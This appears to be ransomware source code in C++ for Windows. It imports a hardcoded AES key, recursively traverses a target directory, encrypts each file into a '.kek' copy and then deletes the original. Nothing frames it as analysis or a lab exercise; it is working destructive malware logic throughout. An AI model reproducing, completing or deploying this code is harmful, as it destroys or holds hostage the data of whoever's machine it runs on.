#include "encrypt.h"

HCRYPTKEY keyimport() {

	BYTE plaintextkey[] = {
	0x08,0x02,0x00,0x00,0x0f,0x66,0x00,0x00,
	0x18,0x00,0x00,0x00,
	0x3e,0x30,0x24,0x7c,0x48,0xa4,0x0f,0x82, 0xfd,0x7c,0xa5,0x1c,0xf6,0x6c,0x07,0xb7,0x68,0x60,0x47,0x86,0xc7,0xb9,0xba,0xab
	};

	HCRYPTPROV prov = NULL;
	HCRYPTKEY clé = NULL;



	if (CryptAcquireContextW(&prov, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {

		std::cout << "Context acquired" << std::endl;
	}
	else {
		DWORD d = GetLastError();
		std::cout << "Failure to acquire context, error code: " << d << std::endl;
		return -1;
	}

	if (CryptImportKey(prov, plaintextkey, sizeof(plaintextkey), 0, 0, &clé)) {

		std::cout << "Key succesfully imported" << std::endl;
		return clé;
	}
	else {

		DWORD d = GetLastError();
		std::cout << "Failure to import key, error code: " << d << std::endl;
		return -1;
	}


}

int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {

	WCHAR szOGFileName[MAX_PATH];
	StringCchCopyW(szOGFileName, MAX_PATH, srcFile);

	WCHAR* pzDestFile = srcFile;
	
	StringCchCatW(pzDestFile, MAX_PATH, L".kek");

	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestFile = INVALID_HANDLE_VALUE;


	DWORD eof = 0;
	PBYTE pbBuffer[960];
	DWORD dwBlockLen = 960;
	DWORD dwBufferLen = 960;
	DWORD dwCount = 0;


	hSourceFile = CreateFileW(szOGFileName, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSourceFile == INVALID_HANDLE_VALUE) {

		DWORD d = GetLastError();
		std::cout << "Error opening handle to the sourcefile, error code: " << d << std::endl;
		return -1;
	}


	hDestFile = CreateFileW(pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hDestFile) {

		DWORD d = GetLastError();
		std::cout << "Error opening handle to the destfile, error code 0x8" << d << std::endl;
		return -1;
	}

	while (eof == 0) {

		if (ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL) == 0) {
			DWORD d = GetLastError();
			std::cout << "Error reading from the sourcefile, error code 0x8:" << d << std::endl;
			break;

		}
		
		if (dwCount < dwBlockLen) {

			eof = 1;
		}

		if (CryptEncrypt(clé, 0, eof, 0, (BYTE*)pbBuffer, &dwCount, dwBufferLen) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error encrypting the buffer, error code 0x" << d << std::endl;
			break;

		}

		if (WriteFile(hDestFile, pbBuffer, dwCount, &dwCount, NULL) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error writing to the destfile, error code 0x:" << d << std::endl;
			break;


		}
	}

	CloseHandle(hSourceFile);
	CloseHandle(hDestFile);

	if (DeleteFile(szOGFileName) == 0) {
		DWORD d = GetLastError();
		std::cout << "Error deleting the OG file, error code 0x:" << d << std::endl;
		return -1;

}

	return 0;
}

bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel) {

	WIN32_FIND_DATAW file_data;
	WCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;

	StringCchCopyW(szDir, MAX_PATH, targetDir);
	StringCchCatW(szDir, MAX_PATH, L"\\*");

	// finds the first file

	hFind = FindFirstFile(szDir, &file_data);
	if (hFind == INVALID_HANDLE_VALUE) {
		std::cout << "FindFirstFile failed, with errorcode 0x: " << GetLastError() << std::endl;
		return false;
	}

	// lists the actual files recursively

	wchar_t szOutLine[MAX_PATH] = { 0 };
	for (int ii = 0; ii < nLevel; ++ii)
		szOutLine[ii] = L'\t';


	do {
		if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			if (L'.' != file_data.cFileName[0]) {

				//printf("  %ws%ws   <DIR>\n", szOutLine, file_data.cFileName);
				StringCchCopyW(szDir + wcslen(targetDir) + 1, MAX_PATH, file_data.cFileName);
				traverse(szDir, clé, nLevel + 1);

			}
		}
		else {
			WCHAR szFullPath[MAX_PATH];
			StringCchCopyW(szFullPath, MAX_PATH, targetDir);
			StringCchCatW(szFullPath, MAX_PATH, L"\\");
			StringCchCatW(szFullPath, MAX_PATH, file_data.cFileName);
			enkrypt(szFullPath, clé);
		}
	} while (FindNextFile(hFind, &file_data) != 0);

	FindClose(hFind);
	return true;


}